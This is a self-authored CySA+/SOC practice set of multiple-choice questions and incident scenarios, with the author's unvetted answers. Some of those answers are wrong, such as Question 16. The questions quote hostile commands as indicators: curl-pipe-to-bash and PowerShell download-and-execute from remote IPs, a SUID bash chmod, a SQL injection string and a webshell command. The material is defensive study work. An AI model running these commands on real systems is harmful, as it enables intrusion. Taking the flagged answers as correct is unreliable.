# 003 — Advanced CySA+ / SOC Practice Set

Author: ViliusDevX
Purpose: Advanced CySA+ / SOC Analyst Preparation
Difficulty: Hard / Analyst-Level

!!!RAW ANSWERS ONLY — KEEP MISTAKES AND UNCERTAINTY!!!

---

# SECTION 1 — ADVANCED QUESTIONS (20)

## Question 1

A security analyst observes the following command executed on a Linux host:

```bash
curl -fsSL http://198.51.100.7/install.sh | bash
```

Which of the following MOST likely describes the risk?

A. Privilege escalation through Kerberos
B. Remote script execution from untrusted source
C. DNS cache poisoning
D. SSL certificate pinning

My Answer:

B, suspicious IP, "install.sh" file name, bash execution

---

## Question 2

A SIEM correlates the following events:

* Multiple 4625 failed logons
* Successful VPN authentication
* Creation of new mailbox forwarding rule

Which of the following MOST likely occurred?

A. Password spraying followed by business email compromise
B. SQL injection
C. Rogue DHCP activity
D. ARP spoofing

My Answer:

A, because of multiple failed logins, vpn auth, and creation of new mailbox forwarding rule

---

## Question 3

An organization stores highly confidential research data. According to company policy, confidentiality takes priority over availability.

Which vulnerability should be remediated FIRST?

A. Public-facing server vulnerable to denial-of-service
B. Internal file server vulnerable to information disclosure
C. Internal printer vulnerable to remote reboot
D. Public-facing system vulnerable to temporary slowdown

My Answer:

B, because confidentiality is most important, so information disclosure should be minimized

---

## Question 4

An analyst discovers users are intermittently redirected from HTTPS to HTTP while accessing an internal portal.

Which of the following MOST likely explains this behavior?

A. SSL stripping/on-path attack
B. VLAN segmentation failure
C. DNS zone transfer
D. RAID controller failure

My Answer:

A, because it's HTTP downgrade attack, mitm

---

## Question 5

Which of the following BEST ensures critical business functions continue operating during a cyberattack?

A. Disaster recovery plan
B. Business continuity plan
C. Vulnerability management plan
D. Acceptable use policy

My Answer:

B, because continuity plan is about business surviving and living during some incident

---

## Question 6

A company wants visibility and policy enforcement for unsanctioned cloud applications used by employees.

Which solution BEST addresses this requirement?

A. CASB
B. IDS
C. SIEM
D. Load balancer

My Answer:

A, because CASB is cloud access security broker, which controls access to cloud from other people

---

## Question 7

A PowerShell script contains the following:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.10/payload.ps1')
```

What is the MOST likely purpose of this command?

A. DNS resolution
B. Download and execute remote payload
C. Memory defragmentation
D. SSL certificate renewal

My Answer:

B

---

## Question 8

An analyst receives the following EDR alert:

```text
Parent Process: winword.exe
Child Process: rundll32.exe
```

Why is this activity suspicious?

A. Word documents normally launch rundll32.exe during updates
B. Office applications spawning LOLBins may indicate malware execution
C. rundll32.exe is not a Windows binary
D. Word automatically performs vulnerability scans

My Answer:

B, because its not a common event, and its common in living of land attacks

---

## Question 9

A threat hunter wants to identify malicious persistence mechanisms on Windows endpoints.

Which artifact should be reviewed FIRST?

A. Browser cookies
B. Registry Run keys and scheduled tasks
C. Monitor brightness settings
D. Printer spooler queue

My Answer:

B, because persistence is identified often in registry run keys and scheduled tasks

---

## Question 10

An organization wants to reduce attacker dwell time.

Which capability BEST supports this objective?

A. Faster detection and response workflows
B. Increased password expiration frequency
C. Disabling all outbound traffic
D. Weekly software inventory reviews

My Answer:

A, because in this case attacker will have less time to act

---

## Question 11

A SOC analyst identifies repeated DNS TXT record requests containing Base64-like strings.

Which technique is MOST likely being used?

A. VLAN hopping
B. DNS tunneling
C. Pass-the-ticket
D. ARP poisoning

My Answer:

B (but not confident on this one)

---

## Question 12

An attacker compromises a valid OAuth application and gains persistent access to user mailboxes even after password resets.

Which control would BEST mitigate this risk?

A. Disable DNSSEC
B. Review and restrict OAuth app consent permissions
C. Increase password length
D. Disable endpoint logging

My Answer:

B, because restricting OAuth permissions would limit attackers access to mailboxes

---

## Question 13

A security analyst wants to ensure evidence remains legally admissible during an investigation.

Which process is MOST important?

A. Chain of custody
B. Load balancing
C. Vulnerability scanning
D. RAID mirroring

My Answer:

A, because chain of custody is a process to ensure some forensic evidence isn't changed

---

## Question 14

A forensic analyst needs to investigate malware that disappears after reboot.

Which evidence source is MOST valuable?

A. Volatile memory acquisition
B. DHCP lease duration
C. Browser bookmarks
D. SSL certificate transparency logs

My Answer:

A

---

## Question 15

Which of the following BEST describes a false negative?

A. Benign activity incorrectly flagged as malicious
B. Malicious activity incorrectly classified as benign
C. Duplicate SIEM event
D. Threat feed outage

My Answer:

B

---

## Question 16

A company wants to proactively search for attacker activity that has bypassed automated detections.

Which activity BEST fits this goal?

A. Threat hunting
B. Disaster recovery testing
C. Password rotation
D. Software procurement review

My Answer:

C, because rotating password lets analysts detect if there was password leakage and unauthorized access

---

## Question 17

A web application firewall blocks repeated requests containing:

```
' OR 1=1 --
```

Which attack was MOST likely attempted?

A. XML injection
B. SQL injection
C. Kerberoasting
D. SSRF

My Answer:

B

---

## Question 18

An analyst identifies outbound traffic to a domain registered two hours ago.

Why is this particularly suspicious?

A. Newly registered domains are commonly used in phishing/C2 infrastructure
B. DNS only works with older domains
C. HTTPS traffic cannot use new domains
D. SIEMs automatically block all new domains

My Answer:

A

---

## Question 19

A Linux administrator discovers:

```bash
chmod +s /bin/bash
```

Why is this concerning?

A. It enables SUID privilege escalation opportunities
B. It disables DNS logging
C. It resets Linux passwords
D. It enables MFA bypass

My Answer:

A, because chmod means change mod and then bash execution

---

## Question 20

Which of the following would MOST likely indicate successful lateral movement?

A. Multiple failed DNS requests
B. Remote service creation and SMB admin share access
C. Browser cache cleanup
D. Local software updates

My Answer:

B

---

# SECTION 2 — ADVANCED SOC SCENARIOS (5)

---

# SCENARIO 1

Azure AD Alerts:

* 37 MFA push requests within 12 minutes
* Successful login from unfamiliar ASN
* OAuth consent granted to "Teams-Backup-Access"

Additional Findings:

* User denied initial MFA requests
* Password reset already performed
* Mailbox forwarding rule created

Tasks:

1. What attack chain MOST likely occurred?
2. Why did password reset not fully contain the threat?
3. What should analysts revoke FIRST?
4. What indicators suggest persistence?
5. What controls could reduce similar attacks?

My Answers:

1. MFA fatigue then data exfil
2. Because attacker already had access to account
3. Freeze/delete mailbox forwarding rule, then immediately lock account or revoke all privileges
4. Attack continuing even after password reset
5. Set limit for max MFA requests, train employees on MFA fatigue attack

---

# SCENARIO 2

Linux Logs:

```bash
Accepted password for devops from 10.0.5.22
sudo: devops : COMMAND=/bin/bash
chmod +s /bin/bash
```

Additional Findings:

* New outbound SSH connections
* Cron job added under /etc/cron.d/
* Large archive created in /tmp/

Tasks:

1. What attack activity is MOST likely occurring?
2. What persistence mechanisms exist?
3. What evidence suggests possible exfiltration?
4. What should be contained FIRST?
5. Which MITRE ATT&CK techniques are likely involved?

My Answers:

1. Password spraying -> priv esc -> persistence through cron job
2. Cron job, SSH connections
3. SSH connections, archive created in tmp
4. Isolate affected machine from internet to prevent more data exfil
5. T1110.003, T1048.001, T1053.003

---

# SCENARIO 3

WAF Logs:

```sql
POST /login
username=admin' OR 1=1 --
```

Shortly afterward:

```text
POST /uploads/webshell.php
cmd.exe /c whoami
```

Additional Findings:

* New local administrator account created
* Outbound HTTPS traffic to VPS provider
* Large outbound encrypted traffic spike

Tasks:

1. What attack chain MOST likely occurred?
2. What evidence indicates persistence?
3. What evidence indicates possible data exfiltration?
4. What should incident responders isolate FIRST?
5. Which MITRE ATT&CK techniques are likely involved?

My Answers:

1. SQL injection -> webshell malicious file execution
2. HTTPS traffic
3. Large traffic spike
4. Affected machines access to internet
5. (skipping for now)

---

# SCENARIO 4

DLP Alerts:

* 18GB of sensitive engineering files downloaded
* Uploads to personal cloud storage
* Activity occurred at 1:17 AM

Additional Findings:

* Employee recently submitted resignation
* Access originated from normal VPN location
* UEBA flagged behavior as anomalous
* No malware detected on workstation

Tasks:

1. What are the TWO most likely explanations?
2. What evidence would distinguish insider threat from account compromise?
3. What should analysts verify FIRST?
4. What containment actions are appropriate?
5. How should incident severity be classified?

My Answers:

1. Its either insider threat or compromised account
2. VPN location, recent resignation submit
3. Persons identity and possible insider threat risk looking at previous incidents
4. Isolating/freezing cloud storage, revoking account privileges
5. Possibly high

---

# SCENARIO 5

SOC Metrics:

* 22,000 alerts per day
* Analysts manually close most phishing alerts
* Mean time to respond increased 40%
* Several true positives missed during last month

Recent Incident:

* Malware beaconed for 9 days before detection
* SIEM generated alerts but analysts ignored them as duplicates
* Analysts report severe burnout

Tasks:

1. What operational failure MOST likely occurred?
2. What SIEM/SOAR improvements would MOST reduce risk?
3. What metrics should leadership monitor?
4. What risks does alert fatigue create?
5. What process changes would MOST improve detection quality?

My Answers:

1. SIEM misalignment, too much manual work, alert rules not fine tuned
2. fine tuning SIEM
3. Missed true positives, recent incidents and their severity, analysts mental health
4. Burnout and missed positives
5. Specifying and tuning SIEM alert rules, and automating review more
